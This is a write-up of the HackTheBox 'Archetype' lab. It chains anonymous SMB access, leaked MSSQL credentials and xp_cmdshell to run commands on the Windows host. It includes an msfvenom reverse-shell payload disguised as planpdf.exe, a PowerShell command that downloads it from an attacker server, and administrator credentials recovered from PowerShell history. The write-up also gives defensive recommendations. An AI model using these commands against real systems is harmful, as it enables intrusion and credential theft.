# Archetype

OS: Windows
Complete: Yes
Date Completed: August 9, 2026
Level: Easy
Status: Done
Time Taken (hrs): 1
Platform: HTB

# Summary

The target was compromised by chaining an unauthenticated SMB share, exposed MSSQL credentials, excessive database privileges, and credentials discovered during post-exploitation.

Nmap → SMB → credentials → MSSQL → xp_cmdshell → payload → WinPEAS → credentials → Evil-WinRM → Administrator

# Attack Process

## Enumeration

An Nmap scan was used to identify open ports on the target.

```bash
nmap -sC -sV 10.129.148.68
      
Starting Nmap 7.95 
Nmap scan report for 10.129.148.68
Host is up (0.11s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
|_ssl-date: 2026-08-09T09:51:49+00:00; 0s from scanner time.
| ms-sql-info: 
|   10.129.148.68:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.148.68:1433: 
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-08-09T09:49:18
|_Not valid after:  2056-08-09T09:49:18
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-08-09T09:51:39
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h24m00s, deviation: 3h07m52s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-08-09T02:51:42-07:00
```

The main takeaways:

- This is a Windows Server 2019 machine.
- Runs MSSQL as a database service.
- Appears to allow unauthenticated SMB access.

MSSQL on 1433 immediately became a high-priority target. Since SMB also allowed guest access, I enumerated the available shares before attempting to attack MSSQL directly.

## Exploitation

### Unauthenticated SMB Share

First, an unauthenticated SMB session was attempted. 

```bash
smbclient -N -L //10.129.148.68                   

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
```

This revealed a `backups` share that was accessible using an unauthenticated SMB session. 

This SMB share provided credentials for the `sql_svc` account. Since MSSQL was exposed on TCP/1433, these credentials were tested against the database service.

```bash
smbclient //10.129.148.68/backups
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                5056511 blocks of size 4096. 2611158 blocks available
```

The configuration file appeared to be related to the MSSQL database service, it also contained the credentials that can be used to access this service. 

```bash
<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
```

### MSSQL using credentials found

Upon logging into the MSSQL service using the credentials found earlier, the privileges held by this account were checked.

```bash
impacket-mssqlclient sql_svc@10.129.148.68 -windows-auth -p 1433

SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT SYSTEM_USER
                    
-----------------   
ARCHETYPE\sql_svc

SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin')
-   
1 
```

After confirming that `sql_svc` was a member of the `sysadmin` role, `xp_cmdshell` was tested to determine whether SQL Server could execute commands on the underlying Windows host.

```bash
EXEC master..xp_cmdshell 'whoami'
output              
-----------------   
archetype\sql_svc   
NULL                
```

To obtain a more practical interactive shell and continue post-exploitation, a reverse-shell executable was generated on the attacker machine using the Metasploit module, named as a planpdf file to blend in as normal traffic and then transferred to the machine using a PowerShell command to download files from the python web server.
**Attacker
    ↓ HTTP
Python web server
    ↓
Windows target**

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.214 LPORT=4444 -f exe > planpdf.exe
python3 -m http.server 4445
#Listener setup
nc -nlvp 4444
```

```bash

EXEC master..xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.15.214:4445/planpdf.exe -outfile planpdf.exe"
```

## Privilege Escalation

After successfully obtaining a reverse shell as the SQL_SVC account on the machine, WinPeas was transferred to the machine and the output was observed, there were two main takeaways from this:

1. WinPEAS identified `SeImpersonatePrivilege`, so JuicyPotato was investigated as a potential privilege-escalation path. This was unsuccessful mainly because of the server mismatch as this is a Windows Server 2019 machine so enumeration continued rather than assuming the privilege was immediately exploitable.
2. WinPEAS also identified a PowerShell history file. Inspecting this file revealed administrator credentials.

```bash
 PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 PS history size: 79B
 
 #credentials found:
 net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

Finally, Evil-WinRM was used to authenticate as Administrator and obtain full administrative access.

```bash
evil-winrm -i 10.129.148.68 -u administrator -p 'MEGACORP_4dm1n!!'
```

# Recommendations

- **Restrict anonymous SMB access.** The `backups` share was accessible without authentication and exposed sensitive configuration data containing service-account credentials.
- **Remove credentials from configuration files.** Database credentials should not be stored in plaintext in configuration files. Use a secure secrets-management mechanism where possible.
- **Apply least privilege to service accounts.** The `sql_svc` account had the MSSQL `sysadmin` role, which allowed OS command execution through `xp_cmdshell`. The account should only have the database permissions required for its function.
- **Disable `xp_cmdshell` when it is not required.** This functionality provides a direct path from SQL-level compromise to operating-system command execution.
- **Protect PowerShell command history.** Administrator credentials were exposed in the PowerShell history of the `sql_svc` account. Sensitive credentials should never be entered directly into commands that may be recorded in shell history.
- **Restrict and monitor remote-management services.** Access to services such as WinRM should be limited to authorized administrators and monitored for suspicious authentication activity.
- **Rotate exposed credentials.** All credentials discovered during the assessment should be considered compromised and rotated.

# Lessons Learnt

- **Enumeration should drive exploitation.** The initial Nmap scan identified both SMB and MSSQL. Rather than attacking MSSQL blindly, SMB enumeration revealed credentials that provided a direct path into the database. Later, WinPEAS identified multiple possible avenues, but continued enumeration ultimately revealed reusable administrator credentials.
- **Always check the privileges of database accounts.** `sql_svc` had the MSSQL `sysadmin` role, which enabled OS command execution through `xp_cmdshell`.
- **Don't tunnel-vision on the first privilege-escalation path.** `SeImpersonatePrivilege` looked promising, but when JuicyPotato didn't work, further enumeration revealed credentials in PowerShell history.
- **Prioritize simple attack paths before complex exploitation.** Credentials, exposed shares, configuration files, and other low-hanging fruit can often provide a more reliable path than attempting complex exploits.
- Credentials found during post-exploitation should immediately be tested against available remote-management services. The administrator credentials allowed access through Evil-WinRM.

# Outcome

The target was fully compromised. An unauthenticated SMB share exposed MSSQL service-account credentials, which provided access to a privileged SQL account. The account's `sysadmin` privileges enabled command execution through `xp_cmdshell`, leading to a shell on the Windows host. Further enumeration exposed administrator credentials in PowerShell history, which were used to obtain full administrative access through WinRM.
